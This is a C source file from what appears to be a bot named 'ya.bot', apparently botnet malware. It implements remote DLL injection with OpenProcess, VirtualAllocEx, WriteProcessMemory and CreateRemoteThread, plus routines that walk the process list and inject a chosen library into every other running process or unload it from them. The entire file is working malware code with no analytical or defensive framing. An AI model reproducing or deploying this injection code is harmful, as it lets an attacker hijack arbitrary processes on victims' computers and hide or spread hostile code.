/*  ya.bot  */

#include "bot.h"

bool inject_freeremotelibrary(DWORD dwPID, DWORD dwBaseAddress)
{
	HANDLE hProcess, hThread;
	LPTHREAD_START_ROUTINE lpModule;

#ifndef NO_DEBUG
		debug_print("[DEBUG] Freeing remote library, inject_freeremotelibrary()");
#endif

		hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);
	if (!hProcess)
			return FALSE;
		lpModule = (LPTHREAD_START_ROUTINE)GetProcAddress(
				GetModuleHandle(string_kernel32library),
				string_injectfreelibraryfunction);
		hThread = CreateRemoteThread(hProcess, NULL, 0, lpModule, (HANDLE)dwBaseAddress, 0, NULL);
	if (!hThread)
			return FALSE;
		CloseHandle(hThread);
		CloseHandle(hProcess);
		return TRUE;
}

bool inject_loadremotelibrary(DWORD dwPID, char *pszLibraryPath)
{
	DWORD dwWritten;
	HANDLE hProcess, hThread;
	LPTHREAD_START_ROUTINE lpModule;
	LPVOID lpBuffer;

#ifndef NO_DEBUG
		debug_print("[DEBUG] Loading remote library, inject_loadremotelibrary()");
#endif

		hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);
	if (!hProcess)
			return FALSE;
		lpModule = (LPTHREAD_START_ROUTINE)GetProcAddress(
				GetModuleHandle(string_kernel32library),
				string_injectloadlibraryfunction);
		lpBuffer = VirtualAllocEx(hProcess,
				NULL,
				strlen(pszLibraryPath) + 1,
				MEM_COMMIT,
				PAGE_READWRITE);
	if (!lpBuffer)
			return FALSE;
	if (!WriteProcessMemory(hProcess,
				lpBuffer,
				pszLibraryPath, 
				strlen(pszLibraryPath) + 1,
				&dwWritten)) return FALSE;
		hThread = CreateRemoteThread(hProcess, NULL, 0, lpModule, lpBuffer, 0, NULL);
	if (!hThread)
			return FALSE;
		CloseHandle(hThread);
		CloseHandle(hProcess);
		return TRUE;
}

DWORD inject_processesloadall(char *pszFilePath)
{
	DWORD dwProcesses = 0;
	HANDLE hProcess;
	PROCESSENTRY32 pe32;

#ifndef NO_DEBUG
		debug_print("[DEBUG] Loading remote library into all processes, inject_processesloadall()");
#endif

		hProcess = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		pe32.dwSize = sizeof(PROCESSENTRY32);
	if (!Process32First(hProcess, &pe32))
	{
			CloseHandle(hProcess);
			return dwProcesses;
	}
	while (Process32Next(hProcess, &pe32))
	{
		if (GetCurrentProcessId() != pe32.th32ProcessID)
			if (inject_loadremotelibrary(pe32.th32ProcessID, pszFilePath))
					dwProcesses++;
	}
		CloseHandle(hProcess);
		return dwProcesses;
}

DWORD inject_processesunloadall(DWORD dwBaseAddress)
{
	DWORD dwProcesses = 0;
	HANDLE hProcess;
	PROCESSENTRY32 pe32;

#ifndef NO_DEBUG
		debug_print("[DEBUG] Unloading remote library from all processes, inject_processesunloadall()");
#endif

		hProcess = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		pe32.dwSize = sizeof(PROCESSENTRY32);
	if (!Process32First(hProcess, &pe32))
	{
			CloseHandle(hProcess);
			return dwProcesses;
	}
	while (Process32Next(hProcess, &pe32))
	{
		if (GetCurrentProcessId() != pe32.th32ProcessID)
			if (inject_freeremotelibrary(pe32.th32ProcessID, dwBaseAddress))
					dwProcesses++;
	}
		CloseHandle(hProcess);
		return dwProcesses;
}